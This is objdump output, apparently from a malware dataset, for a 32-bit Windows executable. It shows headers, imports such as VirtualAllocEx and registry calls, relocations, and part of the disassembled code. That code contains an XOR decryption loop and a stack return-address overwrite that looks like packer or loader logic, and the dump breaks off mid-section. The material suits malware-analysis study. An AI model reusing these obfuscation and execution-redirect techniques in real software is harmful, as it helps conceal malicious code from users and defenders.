
/home/kali/Desktop/TTDN/100malware_AE_ver2/0b1098e8e4f56dcea3c068bd376e2b7ce6ae092ae08f44eca364292d86def11e.exe:     file format pei-i386
/home/kali/Desktop/TTDN/100malware_AE_ver2/0b1098e8e4f56dcea3c068bd376e2b7ce6ae092ae08f44eca364292d86def11e.exe
architecture: i386, flags 0x0000010b:
HAS_RELOC, EXEC_P, HAS_DEBUG, D_PAGED
start address 0x004014f0

Characteristics 0x10e
	executable
	line numbers stripped
	symbols stripped
	32 bit words

Time/Date		Fri Jul 13 00:40:45 2012
Magic			010b	(PE32)
MajorLinkerVersion	2
MinorLinkerVersion	50
SizeOfCode		00023800
SizeOfInitializedData	00004200
SizeOfUninitializedData	00000000
AddressOfEntryPoint	000014f0
BaseOfCode		00001000
BaseOfData		00025000
ImageBase		00400000
SectionAlignment	00001000
FileAlignment		00000200
MajorOSystemVersion	4
MinorOSystemVersion	0
MajorImageVersion	0
MinorImageVersion	0
MajorSubsystemVersion	4
MinorSubsystemVersion	0
Win32Version		00000000
SizeOfImage		0002e000
SizeOfHeaders		00000400
CheckSum		0003268b
Subsystem		00000002	(Windows GUI)
DllCharacteristics	00000000
SizeOfStackReserve	00100000
SizeOfStackCommit	00001000
SizeOfHeapReserve	00100000
SizeOfHeapCommit	00001000
LoaderFlags		00000000
NumberOfRvaAndSizes	00000010

The Data Directory
Entry 0 00000000 00000000 Export Directory [.edata (or where ever we found it)]
Entry 1 000277e0 00000050 Import Directory [parts of .idata]
Entry 2 00000000 00000000 Resource Directory [.rsrc]
Entry 3 00000000 00000000 Exception Directory [.pdata]
Entry 4 00027c00 000008a0 Security Directory
Entry 5 0002d000 000000dc Base Relocation Directory [.reloc]
Entry 6 00000000 00000000 Debug Directory
Entry 7 00000000 00000000 Description Directory
Entry 8 00000000 00000000 Special Directory
Entry 9 00000000 00000000 Thread Storage Directory [.tls]
Entry a 00000000 00000000 Load Configuration Directory
Entry b 00000000 00000000 Bound Import Directory
Entry c 00027864 00000034 Import Address Table Directory
Entry d 00000000 00000000 Delay Import Directory
Entry e 00000000 00000000 CLR Runtime Header
Entry f 00000000 00000000 Reserved

There is an import table in .data at 0x4277e0

The Import Tables (interpreted .data section contents)
 vma:            Hint    Time      Forward  DLL       First
                 Table   Stamp     Chain    Name      Thunk
 000277e0	00027830 00000000 00000000 00027910 00027864

	DLL Name: KERNEL32.dll
	vma:  Hint/Ord Member-Name Bound-To
	27898	 1191  lstrcatW
	278a4	  502  GetModuleHandleA
	278b8	  544  GetProcAddress
	278ca	   67  CloseHandle
	278d8	  641  GetWindowsDirectoryW
	278f0	  127  CreateFileW
	278fe	 1109  VirtualAllocEx

 000277f4	00027850 00000000 00000000 0002792a 00027884

	DLL Name: USER32.dll
	vma:  Hint/Ord Member-Name Bound-To
	2791e	  470  LoadIconA

 00027808	00027858 00000000 00000000 00027952 0002788c

	DLL Name: ADVAPI32.dll
	vma:  Hint/Ord Member-Name Bound-To
	27936	  606  RegOpenKeyW
	27944	  554  RegCloseKey

 0002781c	00000000 00000000 00000000 00000000 00000000


PE File Base Relocations (interpreted .reloc section contents)

Virtual Address: 00001000 Chunk size 180 (0xb4) Number of fixups 86
	reloc    0 offset   29 [1029] HIGHLOW
	reloc    1 offset   37 [1037] HIGHLOW
	reloc    2 offset   3d [103d] HIGHLOW
	reloc    3 offset   4b [104b] HIGHLOW
	reloc    4 offset   67 [1067] HIGHLOW
	reloc    5 offset   71 [1071] HIGHLOW
	reloc    6 offset   78 [1078] HIGHLOW
	reloc    7 offset   e1 [10e1] HIGHLOW
	reloc    8 offset  11a [111a] HIGHLOW
	reloc    9 offset  169 [1169] HIGHLOW
	reloc   10 offset  16e [116e] HIGHLOW
	reloc   11 offset  173 [1173] HIGHLOW
	reloc   12 offset  178 [1178] HIGHLOW
	reloc   13 offset  17d [117d] HIGHLOW
	reloc   14 offset  183 [1183] HIGHLOW
	reloc   15 offset  18a [118a] HIGHLOW
	reloc   16 offset  18f [118f] HIGHLOW
	reloc   17 offset  1c5 [11c5] HIGHLOW
	reloc   18 offset  204 [1204] HIGHLOW
	reloc   19 offset  232 [1232] HIGHLOW
	reloc   20 offset  238 [1238] HIGHLOW
	reloc   21 offset  260 [1260] HIGHLOW
	reloc   22 offset  26e [126e] HIGHLOW
	reloc   23 offset  274 [1274] HIGHLOW
	reloc   24 offset  282 [1282] HIGHLOW
	reloc   25 offset  288 [1288] HIGHLOW
	reloc   26 offset  2d6 [12d6] HIGHLOW
	reloc   27 offset  305 [1305] HIGHLOW
	reloc   28 offset  312 [1312] HIGHLOW
	reloc   29 offset  367 [1367] HIGHLOW
	reloc   30 offset  36e [136e] HIGHLOW
	reloc   31 offset  391 [1391] HIGHLOW
	reloc   32 offset  399 [1399] HIGHLOW
	reloc   33 offset  3a8 [13a8] HIGHLOW
	reloc   34 offset  3ba [13ba] HIGHLOW
	reloc   35 offset  3e8 [13e8] HIGHLOW
	reloc   36 offset  3f5 [13f5] HIGHLOW
	reloc   37 offset  44b [144b] HIGHLOW
	reloc   38 offset  451 [1451] HIGHLOW
	reloc   39 offset  464 [1464] HIGHLOW
	reloc   40 offset  46a [146a] HIGHLOW
	reloc   41 offset  470 [1470] HIGHLOW
	reloc   42 offset  484 [1484] HIGHLOW
	reloc   43 offset  489 [1489] HIGHLOW
	reloc   44 offset  493 [1493] HIGHLOW
	reloc   45 offset  49e [149e] HIGHLOW
	reloc   46 offset  4a5 [14a5] HIGHLOW
	reloc   47 offset  4b3 [14b3] HIGHLOW
	reloc   48 offset  4bd [14bd] HIGHLOW
	reloc   49 offset  504 [1504] HIGHLOW
	reloc   50 offset  50e [150e] HIGHLOW
	reloc   51 offset  549 [1549] HIGHLOW
	reloc   52 offset  568 [1568] HIGHLOW
	reloc   53 offset  581 [1581] HIGHLOW
	reloc   54 offset  586 [1586] HIGHLOW
	reloc   55 offset  58c [158c] HIGHLOW
	reloc   56 offset  7e6 [17e6] HIGHLOW
	reloc   57 offset  7f1 [17f1] HIGHLOW
	reloc   58 offset  80c [180c] HIGHLOW
	reloc   59 offset  877 [1877] HIGHLOW
	reloc   60 offset  8b8 [18b8] HIGHLOW
	reloc   61 offset  943 [1943] HIGHLOW
	reloc   62 offset  95f [195f] HIGHLOW
	reloc   63 offset  99d [199d] HIGHLOW
	reloc   64 offset  9a5 [19a5] HIGHLOW
	reloc   65 offset  9b1 [19b1] HIGHLOW
	reloc   66 offset  9b8 [19b8] HIGHLOW
	reloc   67 offset  9ce [19ce] HIGHLOW
	reloc   68 offset  a26 [1a26] HIGHLOW
	reloc   69 offset  a2b [1a2b] HIGHLOW
	reloc   70 offset  a3d [1a3d] HIGHLOW
	reloc   71 offset  a43 [1a43] HIGHLOW
	reloc   72 offset  a49 [1a49] HIGHLOW
	reloc   73 offset  a4e [1a4e] HIGHLOW
	reloc   74 offset  a53 [1a53] HIGHLOW
	reloc   75 offset  a71 [1a71] HIGHLOW
	reloc   76 offset  a9d [1a9d] HIGHLOW
	reloc   77 offset  ab6 [1ab6] HIGHLOW
	reloc   78 offset  ade [1ade] HIGHLOW
	reloc   79 offset  ae6 [1ae6] HIGHLOW
	reloc   80 offset  aec [1aec] HIGHLOW
	reloc   81 offset  af5 [1af5] HIGHLOW
	reloc   82 offset  b77 [1b77] HIGHLOW
	reloc   83 offset  b82 [1b82] HIGHLOW
	reloc   84 offset  b90 [1b90] HIGHLOW
	reloc   85 offset    0 [1000] ABSOLUTE

Virtual Address: 00024000 Chunk size 28 (0x1c) Number of fixups 10
	reloc    0 offset  694 [24694] HIGHLOW
	reloc    1 offset  69a [2469a] HIGHLOW
	reloc    2 offset  6a0 [246a0] HIGHLOW
	reloc    3 offset  6a6 [246a6] HIGHLOW
	reloc    4 offset  6ac [246ac] HIGHLOW
	reloc    5 offset  6b2 [246b2] HIGHLOW
	reloc    6 offset  6b8 [246b8] HIGHLOW
	reloc    7 offset  6be [246be] HIGHLOW
	reloc    8 offset  6c4 [246c4] HIGHLOW
	reloc    9 offset  6ca [246ca] HIGHLOW

Virtual Address: 00025000 Chunk size 12 (0xc) Number of fixups 2
	reloc    0 offset   a0 [250a0] HIGHLOW
	reloc    1 offset    0 [25000] ABSOLUTE

Sections:
Idx Name          Size      VMA       LMA       File off  Algn
  0 .text         000236ce  00401000  00401000  00000600  2**2
                  CONTENTS, ALLOC, LOAD, READONLY, CODE
  1 .data         00002a00  00425000  00425000  00024000  2**2
                  CONTENTS, ALLOC, LOAD, DATA
  2 .data6        000003e8  00428000  00428000  00026c00  2**2
                  CONTENTS, ALLOC, LOAD, DATA
  3 .data5        000003e8  00429000  00429000  00027000  2**2
                  CONTENTS, ALLOC, LOAD, DATA
  4 .data4        000003e8  0042a000  0042a000  00027400  2**2
                  CONTENTS, ALLOC, LOAD, DATA
  5 .data3        000003e8  0042b000  0042b000  00027800  2**2
                  CONTENTS, ALLOC, LOAD, DATA
  6 .data2        000003e8  0042c000  0042c000  00027c00  2**2
                  CONTENTS, ALLOC, LOAD, DATA
  7 .reloc        000000dc  0042d000  0042d000  00028000  2**2
                  CONTENTS, ALLOC, LOAD, READONLY, DATA
SYMBOL TABLE:
no symbols



Disassembly of section .text:

00401000 <.text>:
  401000:	55                   	push   %ebp
  401001:	8b ec                	mov    %esp,%ebp
  401003:	e8 18 00 00 00       	call   0x401020
  401008:	5d                   	pop    %ebp
  401009:	c3                   	ret
  40100a:	cc                   	int3
  40100b:	cc                   	int3
  40100c:	cc                   	int3
  40100d:	cc                   	int3
  40100e:	cc                   	int3
  40100f:	cc                   	int3
  401010:	55                   	push   %ebp
  401011:	8b ec                	mov    %esp,%ebp
  401013:	8b 45 08             	mov    0x8(%ebp),%eax
  401016:	8b 40 fc             	mov    -0x4(%eax),%eax
  401019:	5d                   	pop    %ebp
  40101a:	c3                   	ret
  40101b:	cc                   	int3
  40101c:	cc                   	int3
  40101d:	cc                   	int3
  40101e:	cc                   	int3
  40101f:	cc                   	int3
  401020:	55                   	push   %ebp
  401021:	8b ec                	mov    %esp,%ebp
  401023:	e8 48 05 00 00       	call   0x401570
  401028:	a1 60 79 42 00       	mov    0x427960,%eax
  40102d:	50                   	push   %eax
  40102e:	e8 dd ff ff ff       	call   0x401010
  401033:	83 c4 04             	add    $0x4,%esp
  401036:	a3 64 79 42 00       	mov    %eax,0x427964
  40103b:	8b 0d 64 79 42 00    	mov    0x427964,%ecx
  401041:	51                   	push   %ecx
  401042:	e8 a9 09 00 00       	call   0x4019f0
  401047:	83 c4 04             	add    $0x4,%esp
  40104a:	a3 68 79 42 00       	mov    %eax,0x427968
  40104f:	5d                   	pop    %ebp
  401050:	c3                   	ret
  401051:	cc                   	int3
  401052:	cc                   	int3
  401053:	cc                   	int3
  401054:	cc                   	int3
  401055:	cc                   	int3
  401056:	cc                   	int3
  401057:	cc                   	int3
  401058:	cc                   	int3
  401059:	cc                   	int3
  40105a:	cc                   	int3
  40105b:	cc                   	int3
  40105c:	cc                   	int3
  40105d:	cc                   	int3
  40105e:	cc                   	int3
  40105f:	cc                   	int3
  401060:	55                   	push   %ebp
  401061:	8b ec                	mov    %esp,%ebp
  401063:	83 ec 14             	sub    $0x14,%esp
  401066:	a1 84 78 42 00       	mov    0x427884,%eax
  40106b:	89 45 f0             	mov    %eax,-0x10(%ebp)
  40106e:	c7 45 f4 00 50 42 00 	movl   $0x425000,-0xc(%ebp)
  401075:	c7 45 fc 5c 50 42 00 	movl   $0x42505c,-0x4(%ebp)
  40107c:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  40107f:	0f b6 11             	movzbl (%ecx),%edx
  401082:	83 fa 55             	cmp    $0x55,%edx
  401085:	74 1d                	je     0x4010a4
  401087:	8b 45 f0             	mov    -0x10(%ebp),%eax
  40108a:	0f b6 08             	movzbl (%eax),%ecx
  40108d:	81 f9 8b 00 00 00    	cmp    $0x8b,%ecx
  401093:	74 0f                	je     0x4010a4
  401095:	8b 55 f0             	mov    -0x10(%ebp),%edx
  401098:	0f b6 02             	movzbl (%edx),%eax
  40109b:	83 f8 6a             	cmp    $0x6a,%eax
  40109e:	74 04                	je     0x4010a4
  4010a0:	33 c0                	xor    %eax,%eax
  4010a2:	eb 68                	jmp    0x40110c
  4010a4:	b9 52 00 00 00       	mov    $0x52,%ecx
  4010a9:	8b 55 fc             	mov    -0x4(%ebp),%edx
  4010ac:	66 89 0a             	mov    %cx,(%edx)
  4010af:	b8 65 00 00 00       	mov    $0x65,%eax
  4010b4:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  4010b7:	66 89 41 02          	mov    %ax,0x2(%ecx)
  4010bb:	ba 65 00 00 00       	mov    $0x65,%edx
  4010c0:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4010c3:	66 89 50 0a          	mov    %dx,0xa(%eax)
  4010c7:	b9 6e 00 00 00       	mov    $0x6e,%ecx
  4010cc:	8b 55 fc             	mov    -0x4(%ebp),%edx
  4010cf:	66 89 4a 0c          	mov    %cx,0xc(%edx)
  4010d3:	b8 4b 00 00 00       	mov    $0x4b,%eax
  4010d8:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  4010db:	66 89 41 0e          	mov    %ax,0xe(%ecx)
  4010df:	8b 15 8c 78 42 00    	mov    0x42788c,%edx
  4010e5:	89 55 f8             	mov    %edx,-0x8(%ebp)
  4010e8:	8d 45 ec             	lea    -0x14(%ebp),%eax
  4010eb:	50                   	push   %eax
  4010ec:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  4010ef:	51                   	push   %ecx
  4010f0:	68 02 00 00 80       	push   $0x80000002
  4010f5:	ff 55 f8             	call   *-0x8(%ebp)
  4010f8:	85 c0                	test   %eax,%eax
  4010fa:	75 09                	jne    0x401105
  4010fc:	b8 01 00 00 00       	mov    $0x1,%eax
  401101:	eb 09                	jmp    0x40110c
  401103:	eb 07                	jmp    0x40110c
  401105:	e8 56 ff ff ff       	call   0x401060
  40110a:	33 c0                	xor    %eax,%eax
  40110c:	8b e5                	mov    %ebp,%esp
  40110e:	5d                   	pop    %ebp
  40110f:	c3                   	ret
  401110:	55                   	push   %ebp
  401111:	8b ec                	mov    %esp,%ebp
  401113:	83 7d 08 01          	cmpl   $0x1,0x8(%ebp)
  401117:	75 08                	jne    0x401121
  401119:	a1 6c 79 42 00       	mov    0x42796c,%eax
  40111e:	89 45 08             	mov    %eax,0x8(%ebp)
  401121:	8b 4d 10             	mov    0x10(%ebp),%ecx
  401124:	51                   	push   %ecx
  401125:	8b 55 0c             	mov    0xc(%ebp),%edx
  401128:	52                   	push   %edx
  401129:	8b 45 08             	mov    0x8(%ebp),%eax
  40112c:	50                   	push   %eax
  40112d:	e8 6e 04 00 00       	call   0x4015a0
  401132:	83 c4 0c             	add    $0xc,%esp
  401135:	8b 4d 08             	mov    0x8(%ebp),%ecx
  401138:	51                   	push   %ecx
  401139:	e8 a2 08 00 00       	call   0x4019e0
  40113e:	83 c4 04             	add    $0x4,%esp
  401141:	89 45 08             	mov    %eax,0x8(%ebp)
  401144:	8b 45 08             	mov    0x8(%ebp),%eax
  401147:	5d                   	pop    %ebp
  401148:	c3                   	ret
  401149:	cc                   	int3
  40114a:	cc                   	int3
  40114b:	cc                   	int3
  40114c:	cc                   	int3
  40114d:	cc                   	int3
  40114e:	cc                   	int3
  40114f:	cc                   	int3
  401150:	55                   	push   %ebp
  401151:	8b ec                	mov    %esp,%ebp
  401153:	81 ec 20 02 00 00    	sub    $0x220,%esp
  401159:	c7 85 f0 fd ff ff 00 	movl   $0x0,-0x210(%ebp)
  401160:	00 00 00 
  401163:	c7 85 f4 fd ff ff 68 	movl   $0x425068,-0x20c(%ebp)
  40116a:	50 42 00 
  40116d:	a1 64 78 42 00       	mov    0x427864,%eax
  401172:	a3 70 79 42 00       	mov    %eax,0x427970
  401177:	68 6c 50 42 00       	push   $0x42506c
  40117c:	68 78 50 42 00       	push   $0x425078
  401181:	ff 15 68 78 42 00    	call   *0x427868
  401187:	50                   	push   %eax
  401188:	ff 15 6c 78 42 00    	call   *0x42786c
  40118e:	a3 74 79 42 00       	mov    %eax,0x427974
  401193:	c7 85 e8 fd ff ff 00 	movl   $0x0,-0x218(%ebp)
  40119a:	00 00 00 
  40119d:	eb 0f                	jmp    0x4011ae
  40119f:	8b 8d e8 fd ff ff    	mov    -0x218(%ebp),%ecx
  4011a5:	83 c1 04             	add    $0x4,%ecx
  4011a8:	89 8d e8 fd ff ff    	mov    %ecx,-0x218(%ebp)
  4011ae:	8b 95 e8 fd ff ff    	mov    -0x218(%ebp),%edx
  4011b4:	3b 55 0c             	cmp    0xc(%ebp),%edx
  4011b7:	73 59                	jae    0x401212
  4011b9:	8b 85 e8 fd ff ff    	mov    -0x218(%ebp),%eax
  4011bf:	05 3e 5b 00 00       	add    $0x5b3e,%eax
  4011c4:	a3 78 79 42 00       	mov    %eax,0x427978
  4011c9:	8b 4d 08             	mov    0x8(%ebp),%ecx
  4011cc:	03 8d e8 fd ff ff    	add    -0x218(%ebp),%ecx
  4011d2:	89 8d e0 fd ff ff    	mov    %ecx,-0x220(%ebp)
  4011d8:	8b 95 e0 fd ff ff    	mov    -0x220(%ebp),%edx
  4011de:	8b 02                	mov    (%edx),%eax
  4011e0:	03 85 e8 fd ff ff    	add    -0x218(%ebp),%eax
  4011e6:	8b 8d e0 fd ff ff    	mov    -0x220(%ebp),%ecx
  4011ec:	89 01                	mov    %eax,(%ecx)
  4011ee:	8b 95 e0 fd ff ff    	mov    -0x220(%ebp),%edx
  4011f4:	89 95 e4 fd ff ff    	mov    %edx,-0x21c(%ebp)
  4011fa:	8b 85 e4 fd ff ff    	mov    -0x21c(%ebp),%eax
  401200:	8b 08                	mov    (%eax),%ecx
  401202:	33 0d 78 79 42 00    	xor    0x427978,%ecx
  401208:	8b 95 e4 fd ff ff    	mov    -0x21c(%ebp),%edx
  40120e:	89 0a                	mov    %ecx,(%edx)
  401210:	eb 8d                	jmp    0x40119f
  401212:	8b e5                	mov    %ebp,%esp
  401214:	5d                   	pop    %ebp
  401215:	c3                   	ret
  401216:	cc                   	int3
  401217:	cc                   	int3
  401218:	cc                   	int3
  401219:	cc                   	int3
  40121a:	cc                   	int3
  40121b:	cc                   	int3
  40121c:	cc                   	int3
  40121d:	cc                   	int3
  40121e:	cc                   	int3
  40121f:	cc                   	int3
  401220:	55                   	push   %ebp
  401221:	8b ec                	mov    %esp,%ebp
  401223:	81 ec cc 02 00 00    	sub    $0x2cc,%esp
  401229:	53                   	push   %ebx
  40122a:	56                   	push   %esi
  40122b:	57                   	push   %edi
  40122c:	c7 85 70 fd ff ff 80 	movl   $0x401a80,-0x290(%ebp)
  401233:	1a 40 00 
  401236:	89 2d 7c 79 42 00    	mov    %ebp,0x42797c
  40123c:	60                   	pusha
  40123d:	c7 85 6c fd ff ff 00 	movl   $0x0,-0x294(%ebp)
  401244:	00 00 00 
  401247:	c7 85 5c fd ff ff 02 	movl   $0x80000002,-0x2a4(%ebp)
  40124e:	00 00 80 
  401251:	e8 0a fe ff ff       	call   0x401060
  401256:	85 c0                	test   %eax,%eax
  401258:	74 38                	je     0x401292
  40125a:	e8 e1 02 00 00       	call   0x401540
  40125f:	a1 60 79 42 00       	mov    0x427960,%eax
  401264:	50                   	push   %eax
  401265:	e8 a6 fd ff ff       	call   0x401010
  40126a:	83 c4 04             	add    $0x4,%esp
  40126d:	a3 64 79 42 00       	mov    %eax,0x427964
  401272:	8b 0d 64 79 42 00    	mov    0x427964,%ecx
  401278:	51                   	push   %ecx
  401279:	e8 72 07 00 00       	call   0x4019f0
  40127e:	83 c4 04             	add    $0x4,%esp
  401281:	a3 80 79 42 00       	mov    %eax,0x427980
  401286:	8b 15 64 79 42 00    	mov    0x427964,%edx
  40128c:	89 95 64 fd ff ff    	mov    %edx,-0x29c(%ebp)
  401292:	c7 85 78 fd ff ff 64 	movl   $0x64,-0x288(%ebp)
  401299:	00 00 00 
  40129c:	c7 85 dc fd ff ff 2a 	movl   $0x2a,-0x224(%ebp)
  4012a3:	00 00 00 
  4012a6:	c7 85 6c fd ff ff 00 	movl   $0x0,-0x294(%ebp)
  4012ad:	00 00 00 
  4012b0:	c7 85 a8 fd ff ff 00 	movl   $0x0,-0x258(%ebp)
  4012b7:	00 00 00 
  4012ba:	c7 85 7c fd ff ff 01 	movl   $0x1,-0x284(%ebp)
  4012c1:	00 00 00 
  4012c4:	c7 85 e4 fd ff ff 00 	movl   $0x0,-0x21c(%ebp)
  4012cb:	00 00 00 
  4012ce:	8b 85 6c fd ff ff    	mov    -0x294(%ebp),%eax
  4012d4:	3b 05 64 79 42 00    	cmp    0x427964,%eax
  4012da:	0f 83 86 00 00 00    	jae    0x401366
  4012e0:	8b 8d 64 fd ff ff    	mov    -0x29c(%ebp),%ecx
  4012e6:	51                   	push   %ecx
  4012e7:	8b 95 78 fd ff ff    	mov    -0x288(%ebp),%edx
  4012ed:	52                   	push   %edx
  4012ee:	e8 2d 08 00 00       	call   0x401b20
  4012f3:	83 c4 08             	add    $0x8,%esp
  4012f6:	89 85 60 fd ff ff    	mov    %eax,-0x2a0(%ebp)
  4012fc:	8b 85 60 fd ff ff    	mov    -0x2a0(%ebp),%eax
  401302:	50                   	push   %eax
  401303:	8b 0d 60 79 42 00    	mov    0x427960,%ecx
  401309:	03 8d a8 fd ff ff    	add    -0x258(%ebp),%ecx
  40130f:	51                   	push   %ecx
  401310:	8b 15 80 79 42 00    	mov    0x427980,%edx
  401316:	03 95 6c fd ff ff    	add    -0x294(%ebp),%edx
  40131c:	52                   	push   %edx
  40131d:	e8 3e 05 00 00       	call   0x401860
  401322:	83 c4 0c             	add    $0xc,%esp
  401325:	8b 85 dc fd ff ff    	mov    -0x224(%ebp),%eax
  40132b:	03 85 78 fd ff ff    	add    -0x288(%ebp),%eax
  401331:	03 85 a8 fd ff ff    	add    -0x258(%ebp),%eax
  401337:	89 85 a8 fd ff ff    	mov    %eax,-0x258(%ebp)
  40133d:	8b 8d 6c fd ff ff    	mov    -0x294(%ebp),%ecx
  401343:	03 8d 78 fd ff ff    	add    -0x288(%ebp),%ecx
  401349:	89 8d 6c fd ff ff    	mov    %ecx,-0x294(%ebp)
  40134f:	8b 95 64 fd ff ff    	mov    -0x29c(%ebp),%edx
  401355:	2b 95 60 fd ff ff    	sub    -0x2a0(%ebp),%edx
  40135b:	89 95 64 fd ff ff    	mov    %edx,-0x29c(%ebp)
  401361:	e9 68 ff ff ff       	jmp    0x4012ce
  401366:	a1 64 79 42 00       	mov    0x427964,%eax
  40136b:	50                   	push   %eax
  40136c:	8b 0d 80 79 42 00    	mov    0x427980,%ecx
  401372:	51                   	push   %ecx
  401373:	e8 d8 fd ff ff       	call   0x401150
  401378:	83 c4 08             	add    $0x8,%esp
  40137b:	c7 85 a8 fd ff ff 00 	movl   $0x0,-0x258(%ebp)
  401382:	00 00 00 
  401385:	c7 85 40 fd ff ff 00 	movl   $0x0,-0x2c0(%ebp)
  40138c:	00 00 00 
  40138f:	8b 15 64 79 42 00    	mov    0x427964,%edx
  401395:	52                   	push   %edx
  401396:	6a 00                	push   $0x0
  401398:	a1 68 79 42 00       	mov    0x427968,%eax
  40139d:	50                   	push   %eax
  40139e:	e8 5d fc ff ff       	call   0x401000
  4013a3:	83 c4 0c             	add    $0xc,%esp
  4013a6:	8b 0d 64 79 42 00    	mov    0x427964,%ecx
  4013ac:	89 8d 38 fd ff ff    	mov    %ecx,-0x2c8(%ebp)
  4013b2:	8b 95 40 fd ff ff    	mov    -0x2c0(%ebp),%edx
  4013b8:	3b 15 64 79 42 00    	cmp    0x427964,%edx
  4013be:	0f 83 85 00 00 00    	jae    0x401449
  4013c4:	8b 85 38 fd ff ff    	mov    -0x2c8(%ebp),%eax
  4013ca:	50                   	push   %eax
  4013cb:	8b 8d 78 fd ff ff    	mov    -0x288(%ebp),%ecx
  4013d1:	51                   	push   %ecx
  4013d2:	e8 49 07 00 00       	call   0x401b20
  4013d7:	83 c4 08             	add    $0x8,%esp
  4013da:	89 85 34 fd ff ff    	mov    %eax,-0x2cc(%ebp)
  4013e0:	8b 95 34 fd ff ff    	mov    -0x2cc(%ebp),%edx
  4013e6:	52                   	push   %edx
  4013e7:	a1 60 79 42 00       	mov    0x427960,%eax
  4013ec:	03 85 a8 fd ff ff    	add    -0x258(%ebp),%eax
  4013f2:	50                   	push   %eax
  4013f3:	8b 0d 68 79 42 00    	mov    0x427968,%ecx
  4013f9:	03 8d 40 fd ff ff    	add    -0x2c0(%ebp),%ecx
  4013ff:	51                   	push   %ecx
  401400:	e8 5b 04 00 00       	call   0x401860
  401405:	83 c4 0c             	add    $0xc,%esp
  401408:	8b 95 dc fd ff ff    	mov    -0x224(%ebp),%edx
  40140e:	03 95 78 fd ff ff    	add    -0x288(%ebp),%edx
  401414:	03 95 a8 fd ff ff    	add    -0x258(%ebp),%edx
  40141a:	89 95 a8 fd ff ff    	mov    %edx,-0x258(%ebp)
  401420:	8b 85 40 fd ff ff    	mov    -0x2c0(%ebp),%eax
  401426:	03 85 78 fd ff ff    	add    -0x288(%ebp),%eax
  40142c:	89 85 40 fd ff ff    	mov    %eax,-0x2c0(%ebp)
  401432:	8b 8d 38 fd ff ff    	mov    -0x2c8(%ebp),%ecx
  401438:	2b 8d 34 fd ff ff    	sub    -0x2cc(%ebp),%ecx
  40143e:	89 8d 38 fd ff ff    	mov    %ecx,-0x2c8(%ebp)
  401444:	e9 69 ff ff ff       	jmp    0x4013b2
  401449:	8b 15 64 79 42 00    	mov    0x427964,%edx
  40144f:	52                   	push   %edx
  401450:	a1 68 79 42 00       	mov    0x427968,%eax
  401455:	50                   	push   %eax
  401456:	e8 f5 fc ff ff       	call   0x401150
  40145b:	83 c4 08             	add    $0x8,%esp
  40145e:	c7 85 70 fd ff ff 80 	movl   $0x401a80,-0x290(%ebp)
  401465:	1a 40 00 
  401468:	8b 0d 80 79 42 00    	mov    0x427980,%ecx
  40146e:	8b 15 68 79 42 00    	mov    0x427968,%edx
  401474:	89 11                	mov    %edx,(%ecx)
  401476:	68 00 90 01 00       	push   $0x19000
  40147b:	e8 70 05 00 00       	call   0x4019f0
  401480:	83 c4 04             	add    $0x4,%esp
  401483:	a3 84 79 42 00       	mov    %eax,0x427984
  401488:	a1 84 79 42 00       	mov    0x427984,%eax
  40148d:	05 00 02 00 00       	add    $0x200,%eax
  401492:	a3 88 79 42 00       	mov    %eax,0x427988
  401497:	68 00 77 01 00       	push   $0x17700
  40149c:	8b 0d 80 79 42 00    	mov    0x427980,%ecx
  4014a2:	51                   	push   %ecx
  4014a3:	8b 15 88 79 42 00    	mov    0x427988,%edx
  4014a9:	52                   	push   %edx
  4014aa:	e8 b1 03 00 00       	call   0x401860
  4014af:	83 c4 0c             	add    $0xc,%esp
  4014b2:	a1 84 79 42 00       	mov    0x427984,%eax
  4014b7:	05 90 75 01 00       	add    $0x17590,%eax
  4014bc:	a3 8c 79 42 00       	mov    %eax,0x42798c
  4014c1:	61                   	popa
  4014c2:	6a 37                	push   $0x37
  4014c4:	8b 85 70 fd ff ff    	mov    -0x290(%ebp),%eax
  4014ca:	8b cc                	mov    %esp,%ecx
  4014cc:	83 e9 22             	sub    $0x22,%ecx
  4014cf:	ba 1e 00 00 00       	mov    $0x1e,%edx
  4014d4:	89 44 11 04          	mov    %eax,0x4(%ecx,%edx,1)
  4014d8:	c3                   	ret
  4014d9:	33 c0                	xor    %eax,%eax
  4014db:	5f                   	pop    %edi
  4014dc:	5e                   	pop    %esi
  4014dd:	5b                   	pop    %ebx
  4014de:	8b e5                	mov    %ebp,%esp
  4014e0:	5d                   	pop    %ebp
  4014e1:	c3                   	ret
  4014e2:	cc                   	int3
  4014e3:	cc                   	int3
  4014e4:	cc                   	int3
  4014e5:	cc                   	int3
  4014e6:	cc                   	int3
  4014e7:	cc                   	int3
  4014e8:	cc                   	int3
  4014e9:	cc                   	int3
  4014ea:	cc                   	int3
  4014eb:	cc                   	int3
  4014ec:	cc                   	int3
  4014ed:	cc                   	int3
  4014ee:	cc                   	int3
  4014ef:	cc                   	int3
  4014f0:	55                   	push   %ebp
  4014f1:	8b ec                	mov    %esp,%ebp
  4014f3:	e8 28 fd ff ff       	call   0x401220
  4014f8:	5d                   	pop    %ebp
  4014f9:	c3                   	ret
  4014fa:	cc                   	int3
  4014fb:	cc                   	int3
  4014fc:	cc                   	int3
  4014fd:	cc                   	int3
  4014fe:	cc                   	int3
  4014ff:	cc                   	int3
  401500:	55                   	push   %ebp
  401501:	8b ec                	mov    %esp,%ebp
  401503:	a1 90 79 42 00       	mov    0x427990,%eax
  401508:	83 e8 08             	sub    $0x8,%eax
  40150b:	d1 e8                	shr    %eax
  40150d:	a3 90 79 42 00       	mov    %eax,0x427990
  401512:	5d                   	pop    %ebp
  401513:	c3                   	ret
  401514:	cc                   	int3
  401515:	cc                   	int3
  401516:	cc                   	int3
  401517:	cc                   	int3
  401518:	cc                   	int3
  401519:	cc                   	int3
  40151a:	cc                   	int3
  40151b:	cc                   	int3
  40151c:	cc                   	int3
  40151d:	cc                   	int3
  40151e:	cc                   	int3
  40151f:	cc                   	int3
  401520:	55                   	push   %ebp
  401521:	8b ec                	mov    %esp,%ebp
  401523:	5d                   	pop    %ebp
  401524:	c2 10 00             	ret    $0x10
  401527:	cc                   	int3
  401528:	cc                   	int3
  401529:	cc                   	int3
  40152a:	cc                   	int3
  40152b:	cc                   	int3
  40152c:	cc                   	int3
  40152d:	cc                   	int3
  40152e:	cc                   	int3
  40152f:	cc                   	int3
  401530:	55                   	push   %ebp
  401531:	8b ec                	mov    %esp,%ebp
  401533:	5d                   	pop    %ebp
  401534:	c2 10 00             	ret    $0x10
  401537:	cc                   	int3
  401538:	cc                   	int3
